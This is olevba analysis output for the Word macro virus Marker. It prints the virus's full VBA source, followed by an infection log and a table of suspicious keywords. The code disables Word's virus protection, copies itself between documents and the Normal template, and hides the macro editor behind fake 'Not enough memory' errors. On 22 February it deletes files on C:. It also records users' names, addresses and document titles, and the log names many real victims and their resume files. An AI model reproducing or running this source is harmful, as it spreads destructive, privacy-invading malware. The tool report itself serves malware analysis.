olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.x-912826ee60c8488b673885162f331599a161834c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.x-912826ee60c8488b673885162f331599a161834c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 












































' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Private Sub Document_Close()
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Const from = "Yugoslavia" 'nuthin' to do with the GeNiUs just needed a marker
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Dim ad, nt As Object
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Dim rep, x As Integer
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Dim virusCode, UserAddress, LogData, LogFile As String
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
DocumentInfected = ad.codemodule.Find(from, 1, 1, 10000, 10000)
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
NormalTemplateInfected = nt.codemodule.Find(from, 1, 1, 10000, 10000)
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Options.VirusProtection = False
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Options.SaveNormalPrompt = True
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Delivery:
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
If Day(Now()) = 22 And Month(Now()) = 2 Then
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Kill "C:\*.*":
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
rep = MsgBox("That's Right", vbOK + vbCritical, "It's Murder")
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
GoTo Delivery
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End If
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
If (DocumentInfected = True Xor NormalTemplateInfected = True) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
If DocumentInfected = True Then
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
SaveNormalTemplate = NormalTemplate.Saved
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
virusCode = ad.codemodule.Lines(1, ad.codemodule.countoflines)
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
For i = 1 To Len(Application.UserAddress)
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End If
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Else
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
UserAddress = UserAddress & Chr(13) & "' "
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End If
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Next i
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
LogData = Chr(13) & "' " & Format(Time, "hh:mm:ss AMPM -") & Format(Date, "dddd,d mmm,yyyy") & Chr(13) & "' " & Application.UserName & Chr(13) & "' " & UserAddress & Chr(13) & "' " & Application.ActiveDocument & Chr(13)
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
virusCode = virusCode & LogData
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
nt.codemodule.Deletelines 1, nt.codemodule.countoflines
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
nt.codemodule.AddFromString virusCode
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
With nt.codemodule
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
.replaceline 174, "Sub viewVBcode()" & Chr(13) & Chr(13) & "x=Msgbox(" & Chr(34) & " Error - Not enough memory!" & Chr(34) & ", VbOkonly + VbApplication+Vbcritical," & Chr(34) & "Visual Basic Editor" & Chr(34) & ")" & Chr(13) & Chr(13) & "End Sub" & Chr(13) & Chr(13) & "Sub ToolsMacro()" & Chr(13) & Chr(13) & "x=Msgbox(" & Chr(34) & " Error - Not enough memory!" & Chr(34) & ", VbOkonly + VbApplication+Vbcritical," & Chr(34) & "Visual Basic Editor" & Chr(34) & ")" & Chr(13) & Chr(13) & "End Sub"
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End With
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
With nt.codemodule
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
For x = 45 To 181 Step 2
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
.replaceline x, "' " & Application.UserName & " " & Application.ActiveDocument & Now & Application.ActivePrinter
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Next x
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End With
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
If SaveNormalTemplate = True Then NormalTemplate.Save
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End If
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
If NormalTemplateInfected = True Then
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
SaveDocument = ActiveDocument.Saved
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
virusCode = nt.codemodule.Lines(1, nt.codemodule.countoflines) & Chr(13) & "' " & Application.ActiveDocument & Chr(13)
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
ad.codemodule.Deletelines 1, ad.codemodule.countoflines
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
ad.codemodule.AddFromString virusCode
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
nt.codemodule.Deletelines 1, nt.codemodule.countoflines
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
nt.codemodule.AddFromString virusCode
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
ad.codemodule.Deletelines 174, 13
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
With ad.codemodule
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
For x = 45 To 181 Step 2
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
.replaceline x, "' " & Application.UserName & " " & Application.ActiveDocument & Now & Application.ActivePrinter
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Next x
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End With
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
If SaveDocument = True Then ActiveDocument.Save
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End If
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End If
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Options.SaveNormalPrompt = False
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub viewVBcode()
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
x = MsgBox(" Error - Not enough memory!", vbOKOnly + VbApplication + vbCritical, "Visual Basic Editor")
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub ToolsMacro()
' Andreas Marx DOC2.DOC23.07.01 12:29:39HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
x = MsgBox(" Error - Not enough memory!", vbOKOnly + VbApplication + vbCritical, "Visual Basic Editor")

End Sub
' Avert Doc2.doc7/1/99 3:48:48 PM
' DziubekT 4week.doc7/7/99 4:27:10 PMHP LaserJet 6L on LPT1:
' Avert Doc2.doc7/1/99 3:48:48 PM
' DziubekT 4week.doc7/7/99 4:27:10 PMHP LaserJet 6L on LPT1:
' Avert Doc2.doc7/1/99 3:48:48 PM
' special.doc
' Avert Doc2.doc7/1/99 3:48:48 PM
' cover.doc

' Document1

' div.doc

' This is it.doc

' Resume.doc

' Resume.doc

' AT.doc

' Document1

' Document1

' AT.DOC

' Proposal.doc

' Document1

' Document1

' Document1

' details.doc

' Resume.doc

' div.doc

' 05:08:00 PM -Monday,24 May,1999
' Siu Pang
'
' div.doc

' beatrix_kwan.doc

' slee.doc

' CV981125.doc

' MassoudW97.doc

' S4R_Int.doc

' Hotlist1.doc

' Roy Zornow resume.doc

' TK Move Manager.doc

' AU Business Manager.doc

' GDLUCK.DOC

' NOMURA.doc

' Operations Generalist.doc

' PBX Telecom Coordinator.doc

' resume.doc

' parm_meegada.doc

' Pramit.doc

' 03:29:30 PM -Thursday,27 May,1999
' Employee
'
' panda.doc

' zendeal2.doc

' Resume34.doc

' ted r doc_.doc

' gurman.doc

' RESUME37.doc

' Paul Smith002.doc

' WANG-W.DOC

' 1resumeAGurman.doc

' Chuck-res.doc

' cv3.doc

' resume38.doc

' BHARG-V.DOC

' flres1.doc

' sample1.doc

' Lawton updated resume.doc

' LEMERISE.DOC

' galianes.doc

' CVUK.doc

' word95_BinLi.doc

' Eduard 1.doc

' rakowski.doc

' DHRUVER.DOC

' 01:08:39 PM -Wednesday,16 Jun,1999
' DhruveR
'
' Dhruver.doc

' 6-15.doc

' DJI RESTORE.doc

' 03:58:39 PM -Wednesday,16 Jun,1999
' Tom Dziubek
'
' DJI RESTORE.doc

' FEC Script.doc

' OutlookDelegates.doc

' nite.doc

' sbranc01.doc

' newuser-djxpress.doc

' june_99.doc

' 02:01:37 PM -Monday,28 Jun,1999
' TozziT
'
' june_99.doc

' teammov1.doc

' 03:34:41 PM -Wednesday,7 Jul,1999
' DziubekT
'
' teammov11.doc

' Document2

' oneweek.doc

' oneweek.doc

' Document1

' twoweek.doc

' 4week.doc

' 03:48:34 PM -Thursday,1 Jul,1999
' Avert
'
' 4WEEK.DOC

' Doc2.doc

' 12:29:39  -Montag,23 Jul,2001
' Andreas Marx
'
' DOC2.DOC

' dok1.doc

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
